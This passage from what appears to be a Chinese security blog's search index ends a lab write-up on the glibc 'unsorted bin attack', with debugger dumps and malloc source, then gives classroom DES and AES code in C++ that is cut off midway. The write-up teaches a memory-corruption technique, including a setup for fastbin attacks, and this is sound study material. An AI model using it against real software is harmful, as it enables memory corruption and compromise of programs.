\t\t\t#想要被修改为超大值的地方0x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840\t0x00000000000000010x7fffffffdda8:\t0x00007fffffffde78\t0x00000001f7ffcca00x7fffffffddb8:\t0x00000000004006a6\t0x00000000000000000x7fffffffddc8:\t0x9c796560ff5ea285\t0x00000000004005b00x7fffffffddd8:\t0x00007fffffffde70\t0x0000000000000000pwndbg&gt; \n执行malloc(0x410)\n执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的最后一个chunk拿出来。\n由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。\n\nunsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。\n\nmalloc之后结果如下：pwndbg&gt; unsortedbinunsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x7fffffffdd68 —▸ 0x400870 (__libc_csu_init) ◂— push   rbppwndbg&gt; x/30gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x0000000000602000 #malloc(0x410)0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007fffffffdd68\t0x00007ffff7dd1b880x7ffff7dd1ba0 &lt;main_arena+128&gt;:\t0x00007ffff7dd1b88\t0x00007ffff7dd1b980x7ffff7dd1bb0 &lt;main_arena+144&gt;:\t0x00007ffff7dd1b98\t0x00007ffff7dd1ba80x7ffff7dd1bc0 &lt;main_arena+160&gt;:\t0x00007ffff7dd1ba8\t0x00007ffff7dd1bb80x7ffff7dd1bd0 &lt;main_arena+176&gt;:\t0x00007ffff7dd1bb8\t0x00007ffff7dd1bc80x7ffff7dd1be0 &lt;main_arena+192&gt;:\t0x00007ffff7dd1bc8\t0x00007ffff7dd1bd80x7ffff7dd1bf0 &lt;main_arena+208&gt;:\t0x00007ffff7dd1bd8\t0x00007ffff7dd1be80x7ffff7dd1c00 &lt;main_arena+224&gt;:\t0x00007ffff7dd1be8\t0x00007ffff7dd1bf8pwndbg&gt; x/16gx 0x7fffffffdd680x7fffffffdd68:\t0x000000000040080a\t0x00000000004008700x7fffffffdd78:\t0x00007ffff7dd1b78\t0x0000000000602010    \t\t\t#现在此地址被更改为较大的数（其值为main_arena+88的地址）0x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840\t0x00000000000000010x7fffffffdda8:\t0x00007fffffffde78\t0x00000001f7ffcca00x7fffffffddb8:\t0x00000000004006a6\t0x00000000000000000x7fffffffddc8:\t0x9c796560ff5ea285\t0x00000000004005b00x7fffffffddd8:\t0x00007fffffffde70\t0x0000000000000000pwndbg&gt;  \n申请过程如下图所示：\n\n\n核心代码如下：\n#glibc-2.23/malloc/malloc.c#源码第3515-3517行--------------------------------------------------------------------/* remove from unsorted list */unsorted_chunks (av)-&gt;bk = bck; //unsortedbin的bk改为chunk的bkbck-&gt;fd = unsorted_chunks (av);//将chunk的bk所指向的fd改为unsortedbin的地址//unsorted_chunks(av)其实是&amp;main_arena.top--------------------------------------------------------------------解释：unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); bck-&gt;fd (chunk的fd)= unsorted_chunks (av);\n运行结果如下:\npwndbg&gt; info localstack_var = 140737351850872\t\t\t\t//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88p = 0x602010\n反思\n再来看一下unsortedbin的源码\nwhile ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))     {       bck = victim-&gt;bk;       if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))         malloc_printerr (check_action, \"malloc(): memory corruption\",                          chunk2mem (victim), av);       size = chunksize (victim);       /*          If a small request, try to use last remainder if it is the          only chunk in unsorted bin.  This helps promote locality for          runs of consecutive small requests. This is the only          exception to best-fit, and applies only when there is          no exact fit for a small chunk.        */ #显然，bck被修改，并不符合这里的要求       if (in_smallbin_range (nb) &amp;&amp;           bck == unsorted_chunks (av) &amp;&amp;           victim == av-&gt;last_remainder &amp;&amp;           (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))         {           /* split and reattach remainder */           remainder_size = size - nb;           remainder = chunk_at_offset (victim, nb);           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;           av-&gt;last_remainder = remainder;           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);           if (!in_smallbin_range (remainder_size))             {               remainder-&gt;fd_nextsize = NULL;               remainder-&gt;bk_nextsize = NULL;             }           set_head (victim, nb | PREV_INUSE |                     (av != &amp;main_arena ? NON_MAIN_ARENA : 0));           set_head (remainder, remainder_size | PREV_INUSE);           set_foot (remainder, remainder_size);           check_malloced_chunk (av, victim, nb);           void *p = chunk2mem (victim);           alloc_perturb (p, bytes);           return p;         }       /* remove from unsorted list */\n可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，**victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。**然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。\nunsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备我们准备把这个地方 0x7fff7b5eecf8 的值 0 更改为一个很大的数一开始先申请一个比较正常的 chunk: 0x24d0010再分配一个避免与 top chunk 合并当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 0x7f691338eb78现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:0x7fff7b5eece8再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址0x7fff7b5eecf8: 0x7f691338eb78\n这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说\n● 我们通过修改循环的次数来使得程序可以执行多次循环。\n● 我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。\n总结\n感觉全篇看最后一句话就够了(哈哈哈)\n总结一下unsortedbin attack这种攻击方式：\n首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值\n\ntarget_addr：目标地址（想要修改为超大数的地址）\n\n","categories":["heap"],"tags":["unsoted bin attack"]},{"title":"密码学实验","url":"/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/","content":"DES\n#include &lt;bits/stdc++.h&gt;using namespace std;string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result=\"\";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}string hex2bin(string s){    //十六进制转化为二进制    unordered_map&lt;char, string&gt; mp;    mp['0'] = \"0000\";    mp['1'] = \"0001\";    mp['2'] = \"0010\";    mp['3'] = \"0011\";    mp['4'] = \"0100\";    mp['5'] = \"0101\";    mp['6'] = \"0110\";    mp['7'] = \"0111\";    mp['8'] = \"1000\";    mp['9'] = \"1001\";    mp['A'] = \"1010\";    mp['B'] = \"1011\";    mp['C'] = \"1100\";    mp['D'] = \"1101\";    mp['E'] = \"1110\";    mp['F'] = \"1111\";    string bin = \"\";    for (int i = 0; i &lt; s.size(); i++) {        bin += mp[s[i]];    }    return bin;}string bin2hex(string s){    // 二进制转化为16进制    unordered_map&lt;string, string&gt; mp;    mp[\"0000\"] = \"0\";    mp[\"0001\"] = \"1\";    mp[\"0010\"] = \"2\";    mp[\"0011\"] = \"3\";    mp[\"0100\"] = \"4\";    mp[\"0101\"] = \"5\";    mp[\"0110\"] = \"6\";    mp[\"0111\"] = \"7\";    mp[\"1000\"] = \"8\";    mp[\"1001\"] = \"9\";    mp[\"1010\"] = \"A\";    mp[\"1011\"] = \"B\";    mp[\"1100\"] = \"C\";    mp[\"1101\"] = \"D\";    mp[\"1110\"] = \"E\";    mp[\"1111\"] = \"F\";    string hex = \"\";    for (int i = 0; i &lt; s.length(); i += 4) {        string ch = \"\";        ch += s[i];        ch += s[i + 1];        ch += s[i + 2];        ch += s[i + 3];        hex += mp[ch];    }    return hex;}string permute(string k, int* arr, int n){    string per = \"\";    for (int i = 0; i &lt; n; i++) {        per += k[arr[i] - 1];    }    return per;}string shift_left(string k, int shifts){    string s = \"\";    for (int i = 0; i &lt; shifts; i++) {        for (int j = 1; j &lt; 28; j++) {            s += k[j];        }        s += k[0];        k = s;        s = \"\";    }    return k;}string xor_(string a, string b){    string ans = \"\";    for (int i = 0; i &lt; a.size(); i++) {        if (a[i] == b[i]) {            ans += \"0\";        }        else {            ans += \"1\";        }    }    return ans;}string encrypt(string pt, vector&lt;string&gt; rkb,               vector&lt;string&gt; rk){    // 16-&gt;2    pt = hex2bin(pt);    // 初始置换    int initial_perm[64]            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,                5,  63, 55, 47, 39, 31, 23, 15, 7 };    // 初始置换    pt = permute(pt, initial_perm, 64);    cout &lt;&lt; \"初始置换后: \" &lt;&lt; bin2hex(pt)         &lt;&lt; endl;    // 拆分成左右32比特    string left = pt.substr(0, 32);    string right = pt.substr(32, 32);    cout &lt;&lt; \"拆分后: L0=\" &lt;&lt; bin2hex(left)         &lt;&lt; \" R0=\" &lt;&lt; bin2hex(right) &lt;&lt; endl;    // E盒扩展    int exp_d[48]            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };    // S盒    int s[8][4][16] = {            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },\t\t\t{ 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }    };    // P盒置换    int per[32]            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };    cout &lt;&lt; endl;    for (int i = 0; i &lt; 16; i++) {        string right_expanded = permute(right, exp_d, 48);        string x = xor_(rkb[i], right_expanded);        // S        string op = \"\";        for (int i = 0; i &lt; 8; i++) {            int row = 2 * int(x[i * 6] - '0')                      + int(x[i * 6 + 5] - '0');            int col = 8 * int(x[i * 6 + 1] - '0')                      + 4 * int(x[i * 6 + 2] - '0')                      + 2 * int(x[i * 6 + 3] - '0')                      + int(x[i * 6 + 4] - '0');            int val = s[i][row][col];            op += char(val / 8 + '0');            val = val % 8;            op += char(val / 4 + '0');            val = val % 4;            op += char(val / 2 + '0');            val = val % 2;            op += char(val + '0');        }        op = permute(op, per, 32);        x = xor_(op, left);        left = x;        // 交换左右        if (i != 15) {            swap(left, right);        }        cout &lt;&lt; \"轮数: \" &lt;&lt; i + 1 &lt;&lt; \" \" &lt;&lt; bin2hex(left)             &lt;&lt; \" \" &lt;&lt; bin2hex(right) &lt;&lt; \" \" &lt;&lt; rk[i]             &lt;&lt; endl;    }    // 左右结合    string combine = left + right;    // IP逆置换    int final_perm[64]            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,                26, 33, 1,  41, 9,  49, 17, 57, 25 };    string cipher = bin2hex(permute(combine, final_perm, 64));    return cipher;}int main(){    string pt, key;    cout&lt;&lt;\"请输入明文: \";    cin&gt;&gt;pt;    cout&lt;&lt;\"请输入密文: \";    cin&gt;&gt;key;    pt = string_to_hex(pt);    cout&lt;&lt;pt;    key = string_to_hex(key);    key = hex2bin(key);    int keyp[56]            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,                29, 21, 13, 5,  28, 20, 12, 4 };    //密钥生成    key = permute(key, keyp, 56);    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,                            1, 2, 2, 2, 2, 2, 2, 1 };    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,                         15, 6,  21, 10, 23, 19, 12, 4,                         26, 8,  16, 7,  27, 20, 13, 2,                         41, 52, 31, 37, 47, 55, 30, 40,                         51, 45, 33, 48, 44, 49, 39, 56,                         34, 53, 46, 42, 50, 36, 29, 32 };    string left = key.substr(0, 28);    string right = key.substr(28, 28);    vector&lt;string&gt; rkb;    vector&lt;string&gt; rk;    for (int i = 0; i &lt; 16; i++) {        left = shift_left(left, shift_table[i]);        right = shift_left(right, shift_table[i]);        string combine = left + right;        string RoundKey = permute(combine, key_comp, 48);        rkb.push_back(RoundKey);        rk.push_back(bin2hex(RoundKey));    }    cout &lt;&lt; \"加密:\\n\";    string cipher = encrypt(pt, rkb, rk);    cout &lt;&lt; \"密文: \" &lt;&lt; cipher &lt;&lt; endl;    cout &lt;&lt; \"解密:\\n\";    reverse(rkb.begin(), rkb.end());    reverse(rk.begin(), rk.end());    string text = encrypt(cipher, rkb, rk);    text = hex_to_string(text);    cout &lt;&lt; \"明文: \" &lt;&lt; text &lt;&lt; endl;}\nAES\n#include &lt;iostream&gt;#include &lt;bits/stdc++.h&gt;#include &lt;stdint.h&gt;#include&lt;iomanip&gt;void AddRoundKey(uint8_t mtx[],uint32_t w[]);uint32_t SubKeys(uint32_t temp);void SubBytes(uint8_t mtx[],int len);void KeyExpansion(uint8_t key[], uint32_t new_key[]);void Display(uint8_t Matrix[]);void DisplayKeys(uint8_t Matrix[][16]);uint32_t left_bit_move(uint32_t val, int n);using namespace std;uint32_t T[4][256];//存储4张列混淆表int mixCol[4][4] = {        {0x02, 0x03, 0x01, 0x01},        {0x01, 0x02, 0x03, 0x01},        {0x01, 0x01, 0x02, 0x03},        {0x03, 0x01, 0x01, 0x02}};//列混淆矩阵uint8_t S_Box[16][16] =        {                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}        };//逆S盒uint8_t Inv_S_Box[16][16] =        {                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}        };//轮密钥加uint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};uint32_t left_bit_move(uint32_t val, int n) {    uint32_t size = sizeof(val) * 8;    n = n % size;    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移}string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result=\"\";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}//制作列混淆表uint8_t Mul_02(uint8_t x){    if((x&gt;&gt;7) == 0)        return x&lt;&lt;1;    else        return ((x&lt;&lt;1)^0x1b)&amp;0xff;}uint32_t get_output_col1(uint8_t x){    x = (uint32_t)x;    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));    //2113}uint32_t get_output_col2(uint8_t x){    x = (uint32_t)x;    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);    //3211}uint32_t get_output_col3(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);    //1321}uint32_t get_output_col4(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));    //1132}void get_TAB(){    for(int i=0;i&lt;4;i++) {        for (int j = 0; j &lt; 256; j++) {            T[i][j]=0;        }    }    for(int i=0;i&lt;256;i++) {        T[0][i] = get_output_col1((uint8_t) i);        T[1][i] = get_output_col2((uint8_t) i);        T[2][i] = get_output_col3((uint8_t) i);        T[3][i] = get_output_col4((uint8_t) i);    }    //输出列混淆表//    for(int i=0;i&lt;4;i++) {//        for (int j = 0; j &lt; 256; j++) {//            //printf(\"%8x \",T[i][j]);//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; \" \";//        }//        cout&lt;&lt;endl;//    }}uint8_t GFMul(uint8_t a, uint8_t b) {    uint8_t p = 0;    uint8_t high;    for (int counter = 0; counter &lt; 8; counter++)    {        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出        a &lt;&lt;= 1;//a左移一位，即乘以2        if (high != 0){//发生溢出            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1        b &gt;&gt;= 1;//右移，看b的下一位了    }    return p;}void KeyExpansion(uint8_t key[], uint32_t w[]){    int j=0;    uint32_t temp=0;    // w[]的前4个就是输入的key    //初始化w[0]-&gt;w[3]    for(int i=0; i&lt;4;i++){        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);        //printf(\"%d:%x\\n\",i,w[i]);    }    //创建w[4]-&gt;w[43]    for(int i=4; i&lt;44;i++){        if(i%4==0){            temp = left_bit_move(w[i-1],8);//循环左移8位            temp =  SubKeys(temp);            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];            //printf(\"%d:%x\\n\",i,w[i]);        }        else {            w[i] = w[i - 1] ^ w[i - 4];            //printf(\"%d:%x\\n\",i,w[i]);        }    }}void AddRoundKey(uint8_t mtx[],uint32_t w[]){    for(int i=0; i&lt;4; i++){        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;        uint8_t w4 = (w[i]) &amp; 0xff;        mtx[i] ^= w1;  //按列异或        mtx[i+4] ^= w2;        mtx[i+8] ^= w3;        mtx[i+12] ^= w4;    }}//  S盒密钥变换 - 前4位为行号，后4位为列号uint32_t SubKeys(uint32_t temp){    uint8_t w[4] = {0};    int j=0;    //循环4次    for(int i=3; i&gt;=0; i--){        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;    }    SubBytes(w,4);    return 